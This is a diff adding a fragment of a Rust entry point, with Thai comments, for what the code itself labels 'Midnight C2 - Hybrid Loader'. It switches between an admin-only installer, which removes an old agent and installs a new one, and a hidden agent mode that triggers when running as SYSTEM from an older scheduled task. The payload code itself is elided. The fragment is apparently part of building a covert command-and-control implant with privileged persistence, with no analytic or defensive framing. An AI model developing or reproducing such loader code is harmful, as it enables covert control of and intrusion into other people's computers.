@@ -1,0 +1,54 @@
+// (ส่วนเริ่มไฟล์เหมือนเดิมจนถึง Get_install_info)
+// ... [โค้ดส่วนต้นของ main.rs ด้านบน] ...
+
+// กู้คืนฟังก์ชันหลักที่มีการแก้เรื่อง Backward Compatibility
+fn main() -> windows::core::Result<()> {
+    unsafe {
+        let args: Vec<String> = std::env::args().collect();
+        let (current_path, target_path, is_admin) = get_install_info();
+        
+        // --- IMPROVED AGENT MODE DETECTION (Memory Restore) ---
+        // ตรวจสอบว่าเป็น Agent โหมดหรือไม่จาก:
+        // 1. มีอาร์กิวเมนต์ 'agent'
+        // 2. รันจาก Path ติดตั้งหลัก (กรณีรุ่นเก่าอัปเกรดมา)
+        // 3. รันด้วยสิทธิ์ SYSTEM (กรณี Scheduled Task รุ่นเก่า)
+        let is_target_path = current_path.to_lowercase() == target_path.to_lowercase();
+        let is_system = std::env::var("USERNAME").unwrap_or_default().to_uppercase() == "SYSTEM";
+        
+        let is_agent_mode = (args.len() > 1 && args[1] == "agent") || is_target_path || is_system;
+        
+        if !is_agent_mode {
+            // ===== INSTALLER MODE (v0.6.10) =====
+            let hwnd = create_installer_window();
+            std::thread::spawn(move || {
+                append_log("╔════════════════════════════════════════╗");
+                append_log("║   Midnight C2 - Hybrid Loader v0.6.10 ║");
+                append_log("║       Build Date: 2026-02-15          ║");
+                append_log("╚════════════════════════════════════════╝");
+                append_log("");
+                
+                if !is_admin {
+                    append_log(" [!] ERROR: Administrator privileges required!");
+                    return;
+                }
+
+                append_log("[*] Running in INSTALLER mode [ADMIN]");
+                uninstall_old_agent();
+                match install_agent() {
+                    Ok(_) => {
+                        append_log("");
+                        append_log("  ✅ Installation Complete!");
+                        std::thread::sleep(std::time::Duration::from_secs(3));
+                        std::process::exit(0);
+                    }
+                    Err(e) => { append_log(&format!(" [!] Error during installation: {}", e)); }
+                }
+            });
+            // Loop ข้อความวินโดว์... (เหมือนเดิม)
+        } else {
+            // ===== AGENT MODE (HIDDEN) =====
+            // ... (โค้ดส่วนรัน Agent เหมือนเดิม)
+        }
+        Ok(())
+    }
+}
